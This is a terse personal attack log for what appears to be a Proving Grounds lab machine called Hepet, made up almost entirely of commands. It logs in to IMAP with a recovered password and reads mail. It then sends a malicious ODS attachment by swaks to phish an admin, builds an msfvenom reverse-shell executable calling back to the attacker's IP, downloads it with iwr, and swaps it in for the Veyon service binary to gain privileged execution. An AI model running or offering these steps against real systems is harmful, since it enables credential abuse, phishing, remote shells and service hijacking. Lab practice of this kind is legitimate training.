![[Pasted image 20260705022709.png]]

![[Pasted image 20260705023204.png]]
![[Pasted image 20260705023333.png]]

jonas:SicMundusCreatusEst

a1 login "jonas" "SicMundusCreatusEst"

a1 LIST "" *

a1 select INBOX

![[Pasted image 20260705023648.png]]

a1 fetch 2 body[text]

![[Pasted image 20260705023728.png]]

a1 fetch 2 body[header]

![[Pasted image 20260705023804.png]]

python3 mmg-ods.py windows 192.168.49.52 443 (our machine IP)
 ![[Pasted image 20260705023935.png]]

sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.52.140--body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"

![[Pasted image 20260705050615.png]]

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.52 LPORT=9999 -f exe -o reverse.exe
```

python -m http.server 80 


```

PS C:\Users\Ela Arwel\Veyon> iwr http://192.168.49.52/reverse.exe -OutFile "C:\Users\Ela Arwel\Veyon\reverse.exe"
PS C:\Users\Ela Arwel\Veyon> dir veyon-service.exe

    Directory: C:\Users\Ela Arwel\Veyon

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/13/2020  10:40 AM         24664  veyon-service.exe


PS C:\Users\Ela Arwel\Veyon> iwr http://192.168.49.53/exp.exe -OutFile "C:\Users\Ela Arwel\Veyon\exp.exe"
PS C:\Users\Ela Arwel\Veyon> dir exp.exe

    Directory: C:\Users\Ela Arwel\Veyon

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/7/2026   2:40 PM          7680  exp.exe


PS C:\Users\Ela Arwel\Veyon> move "C:\Users\Ela Arwel\Veyon\veyon-service.exe" "C:\Users\Ela Arwel\Veyon\veyon-service.exe.bak"
PS C:\Users\Ela Arwel\Veyon> move "C:\Users\Ela Arwel\Veyon\exp.exe" "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
PS C:\Users\Ela Arwel\Veyon> dir veyon-service.exe

    Directory: C:\Users\Ela Arwel\Veyon

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/7/2026   2:40 PM          7680  veyon-service.exe


```

nc -lnvp 8080

swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.53.140 --body "hi" --header "Subject: test"


swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.53.140 --body "hi" --header "subject: test

https://odabasi52.github.io/2026/03/07/pg-practice-hepet.html

https://4ykh4ncyb3r.github.io/posts/hepet/

https://krovs.github.io/seclogs/hepet/ ( works)


iwr http://192.168.49.52/reverse.exe -OutFile "C:\Users\Ela Arwel\Veyon\reverse.exe"

move veyon-service.exe veyon-old.exe

move reverse.exe veyon-service.exe

Restart-Computer -Force

![[Pasted image 20260706005949.png]]

![[Pasted image 20260706010055.png]]
